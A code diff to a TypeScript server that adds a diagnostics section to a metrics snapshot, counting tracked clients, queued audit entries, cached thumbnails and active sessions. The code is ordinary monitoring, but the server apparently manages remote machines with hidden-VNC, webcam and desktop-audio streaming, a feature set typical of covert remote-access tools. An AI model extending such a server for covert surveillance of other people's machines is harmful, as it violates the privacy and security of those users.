@@ -12,10 +12,11 @@ import { ClientInfo, ClientRole } from "./types";
 import { v4 as uuidv4 } from "uuid";
 import { authenticateRequest } from "./auth";
 import { loadConfig, getConfig } from "./config";
-import { flushAuditLogsSync } from "./auditLog";
+import { flushAuditLogsSync, getAuditQueueStats } from "./auditLog";
 import { getUserById, getUsersForNotificationDelivery, getUsersForNotificationDeliveryByClientOwnership, isClientOwnedByUser, canUserAccessClient } from "./users";
 import { requireAuth, requirePermission } from "./rbac";
 import { metrics } from "./metrics";
+import { getClientDbSyncStats } from "./client-db-sync";
 import { ensureDataDir } from "./paths";
 import { handleAuthRoutes } from "./server/routes/auth-routes";
 import { handleAutoScriptsRoutes } from "./server/routes/auto-scripts-routes";
@@ -146,6 +147,7 @@ import {
 } from "./server/ws-desktop-audio";
 import { createNotificationPluginHandlers } from "./server/ws-notifications-plugin";
 import { loadOrGenerateVapidKeys } from "./server/web-push";
+import { getThumbnailStats } from "./thumbnails";
 import * as clientManager from "./clientManager";
 import * as sessionManager from "./sessions/sessionManager";
 import type { SocketData } from "./sessions/types";
@@ -156,6 +158,9 @@ import { handleBuildTagConnection } from "./server/build-tag";
 
 metrics.setSnapshotEnricher((snapshot) => {
   const summary = getClientMetricsSummary();
+  const dbSync = getClientDbSyncStats();
+  const audit = getAuditQueueStats();
+  const thumbnails = getThumbnailStats();
   snapshot.clients.total = summary.total;
   snapshot.clients.online = summary.online;
   snapshot.clients.offline = summary.total - summary.online;
@@ -165,6 +170,35 @@ metrics.setSnapshotEnricher((snapshot) => {
   snapshot.sessions.remoteDesktop = sessionManager.getRdSessionCount();
   snapshot.sessions.fileBrowser = sessionManager.getFileBrowserSessionCount();
   snapshot.sessions.process = sessionManager.getProcessSessionCount();
+  snapshot.diagnostics = {
+    retained: {
+      clientsMap: clientManager.getClientCount(),
+      clientDbSyncTracked: dbSync.trackedClients,
+      clientDbSyncPending: dbSync.pendingUpdates,
+      clientDbSyncFlushScheduled: dbSync.flushScheduled,
+      auditQueued: audit.queued,
+      thumbnailsCached: thumbnails.cachedCount,
+      thumbnailBytes: thumbnails.cachedBytes,
+      thumbnailPendingFrames: thumbnails.pendingFrames,
+      thumbnailGenQueued: thumbnails.genQueued,
+      thumbnailGenState: thumbnails.genStateTracked,
+      dashboardSessions: sessionManager.getDashboardSessionCount(),
+      notificationSessions: sessionManager.getNotificationSessionCount(),
+      chatSessions: sessionManager.getChatSessionCount(),
+      pluginLoadedClients: pluginLoadedByClient.size,
+      pluginLoadingClients: pluginLoadingByClient.size,
+      pendingPluginEvents: pendingPluginEvents.size,
+      pendingHttpDownloads: pendingHttpDownloads.size,
+      downloadIntents: downloadIntents.size,
+      deployUploads: deployUploads.size,
+      winreUploads: winreUploads.size,
+      notificationRateClients: notificationRate.size,
+      pendingNotificationScreenshots: pendingNotificationScreenshots.size,
+      rdStreamingClients: rdStreamingState.size,
+      hvncStreamingClients: hvncStreamingState.size,
+      webcamStreamingClients: webcamStreamingState.size,
+    },
+  };
 });
 
 const config = loadConfig();
